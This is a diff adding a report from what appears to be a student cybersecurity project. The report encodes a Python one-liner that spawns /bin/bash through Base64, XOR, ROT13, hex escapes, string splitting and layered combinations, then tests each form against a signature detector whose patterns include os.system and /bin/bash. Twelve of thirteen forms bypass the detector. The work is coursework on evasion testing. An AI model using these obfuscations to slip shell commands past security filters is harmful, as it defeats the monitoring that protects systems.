@@ -1,0 +1,112 @@
+══════════════════════════════════════════════════════════════════════
+  CUSTOM PAYLOAD ENCODER & OBFUSCATION FRAMEWORK
+  Unified Mentor — Cybersecurity Project 2
+  Report Generated : June 2026
+  XOR Key          : 0x41 (65)
+══════════════════════════════════════════════════════════════════════
+
+  [ORIGINAL PAYLOAD]
+──────────────────────────────────────────────────────────────────────
+  Payload  : python3 -c "import os; os.system('/bin/bash')"
+  Verdict  : DETECTED
+  Matched  : /bin/bash, systems*(, os.system
+
+══════════════════════════════════════════════════════════════════════
+  ENCODING & OBFUSCATION RESULTS
+══════════════════════════════════════════════════════════════════════
+
+  [Base64 Encoded]
+──────────────────────────────────────────────────────────────────────
+  Output   : cHl0aG9uMyAtYyAiaW1wb3J0IG9zOyBvcy5zeXN0ZW0oJy9iaW4vYmFzaCcpIg==
+  Verdict  : BYPASSED
+
+  [XOR Encoded (key=0x41)]
+──────────────────────────────────────────────────────────────────────
+  Output   : 313835292e2f72616c226163282c312e3335612e327a612e326f32383235242c69666e23282f6e23203229666863
+  Verdict  : BYPASSED
+
+  [ROT13 Encoded]
+──────────────────────────────────────────────────────────────────────
+  Output   : clguba3 -p "vzcbeg bf; bf.flfgrz('/ova/onfu')"
+  Verdict  : BYPASSED
+
+  [Base64 → XOR (multi-layer)]
+──────────────────────────────────────────────────────────────────────
+  Output   : 22092d71200678340c380035183800282016703623720b710806783b0e3803372238743b24190f711b16712e0b3878282...
+  Verdict  : BYPASSED
+
+  [ROT13 → Base64 (multi-layer)]
+──────────────────────────────────────────────────────────────────────
+  Output   : Y2xndWJhMyAtcCAidnpjYmVnIGJmOyBiZi5mbGZncnooJy9vdmEvb25mdScpIg==
+  Verdict  : BYPASSED
+
+  [XOR → Base64 → ROT13 (3-layer)]
+──────────────────────────────────────────────────────────────────────
+  Output   : ZmRmBQZ1ZwxlMGWzAmV2ZGMwZwV2ZGLmZwtlLmZkZzHmZmZ1AwRlMGZlA2R2ZGWyZmV2MwZlZmtmZwZ1ZwDlLmL5AwL2MGVmZ...
+  Verdict  : BYPASSED
+
+  [Obfuscation: Random Char Insertion]
+──────────────────────────────────────────────────────────────────────
+  Output   : py+t&hon3: $-=c "import :os_; %os.s;ystem('/bi*n/bash')."+
+  Verdict  : BYPASSED
+
+  [Obfuscation: Split & Concat]
+──────────────────────────────────────────────────────────────────────
+  Output   : "pyth" + "on3 " + "-c "" + "impo" + "rt o" + "s; o" + "s.sy" + "stem" + "('/b" + "in/b" + "ash'" ...
+  Verdict  : BYPASSED
+
+  [Obfuscation: Hex Escape Sequences]
+──────────────────────────────────────────────────────────────────────
+  Output   : pyt\x68o\x6e\x33 -c "i\x6dpor\x74 \x6f\x73; \x6f\x73.sy\x73t\x65m('/\x62\x69\x6e/\x62\x61\x73h')"
+  Verdict  : BYPASSED
+
+  [Obfuscation: String Reversal]
+──────────────────────────────────────────────────────────────────────
+  Output   : ")'hsab/nib/'(metsys.so ;so tropmi" c- 3nohtyp
+  Verdict  : BYPASSED
+
+  [Obfuscation: Case Swap]
+──────────────────────────────────────────────────────────────────────
+  Output   : PYTHON3 -C "IMPORT OS; OS.SYSTEM('/BIN/BASH')"
+  Verdict  : DETECTED
+  Matched  : /bin/bash, systems*(, os.system
+
+  [Base64 + Escape Obfuscation (hybrid)]
+──────────────────────────────────────────────────────────────────────
+  Output   : \x63\x48l\x30\x61\x47\x39uM\x79\x41\x74Y\x79Ai\x61W1\x77\x623\x4a\x30\x49G9\x7a\x4f\x79Bv\x63y5\x...
+  Verdict  : BYPASSED
+
+  [XOR + Split-Concat Obfuscation (hybrid)]
+──────────────────────────────────────────────────────────────────────
+  Output   : "3138" + "3529" + "2e2f" + "7261" + "6c22" + "6163" + "282c" + "312e" + "3335" + "612e" + "327a" ...
+  Verdict  : BYPASSED
+
+══════════════════════════════════════════════════════════════════════
+  EVASION EFFECTIVENESS SUMMARY
+══════════════════════════════════════════════════════════════════════
+
+  Technique                                Verdict      Matches
+  ────────────────────────────────────────────────────────────────────
+  Base64 Encoded                           BYPASSED     0
+  XOR Encoded (key=0x41)                   BYPASSED     0
+  ROT13 Encoded                            BYPASSED     0
+  Base64 → XOR (multi-layer)               BYPASSED     0
+  ROT13 → Base64 (multi-layer)             BYPASSED     0
+  XOR → Base64 → ROT13 (3-layer)           BYPASSED     0
+  Obfuscation: Random Char Insertion       BYPASSED     0
+  Obfuscation: Split & Concat              BYPASSED     0
+  Obfuscation: Hex Escape Sequences        BYPASSED     0
+  Obfuscation: String Reversal             BYPASSED     0
+  Obfuscation: Case Swap                   DETECTED     3
+  Base64 + Escape Obfuscation (hybrid)     BYPASSED     0
+  XOR + Split-Concat Obfuscation (hybrid)  BYPASSED     0
+
+  ────────────────────────────────────────────────────────────────────
+  Original Payload Detected  : YES ⚠
+  Techniques Tested          : 13
+  Detection Bypassed         : 12/13  (92.3%)
+  Still Detected             : 1/13  (7.7%)
+
+══════════════════════════════════════════════════════════════════════
+  END OF REPORT
+══════════════════════════════════════════════════════════════════════
